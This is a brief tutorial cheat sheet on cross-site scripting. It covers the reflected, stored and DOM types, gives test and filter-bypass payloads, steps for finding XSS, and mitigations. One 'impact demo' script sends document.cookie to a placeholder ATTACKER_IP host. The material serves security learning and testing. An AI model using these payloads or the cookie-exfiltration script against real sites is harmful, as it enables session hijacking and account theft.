# Cross-Site Scripting (XSS)

Inject client-side scripts into web pages viewed by other users.

## Types

### Reflected XSS

Payload is in the request and reflected in the response. Requires the victim to click a crafted link.

```
http://target.com/search?q=<script>alert(1)</script>
```

### Stored XSS

Payload is saved on the server (database, comment field, profile) and displayed to all users who view the page. More dangerous than reflected.

```html
<!-- In a comment field -->
<script>alert(1)</script>
```

### DOM-Based XSS

Payload is processed by client-side JavaScript without hitting the server.

```
http://target.com/page#<script>alert(1)</script>
```

## Testing Payloads

### Basic

```html
<script>alert(1)</script>
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Filter Bypass

```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Without script tags -->
<img src=x onerror=alert(1)>
<body onload=alert(1)>

<!-- Encoded -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C/script%253E
```

### Cookie Stealing (Impact Demo)

```html
<script>
var i = new Image();
i.src = "http://ATTACKER_IP/?cookie=" + document.cookie;
</script>
```

## Finding XSS

1. Identify all input points (forms, URL params, headers)
2. Enter a unique string (e.g., `test123xss`) and check where it appears in the response
3. Check if the string is HTML-encoded or raw
4. If raw, try injecting HTML/JS payloads
5. Check the context -- inside a tag attribute, script block, or HTML body

## Mitigations

- Output encoding (HTML entity encoding)
- Content Security Policy (CSP) headers
- Input validation
- HTTPOnly flag on cookies (prevents JS access)
- Use frameworks that auto-escape output (React, Angular)
